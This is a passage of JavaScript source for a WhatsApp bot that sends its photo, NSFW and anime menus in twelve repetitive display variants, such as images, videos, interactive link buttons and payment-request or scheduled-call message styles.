                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'photooxymenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'nsfwmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'animemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
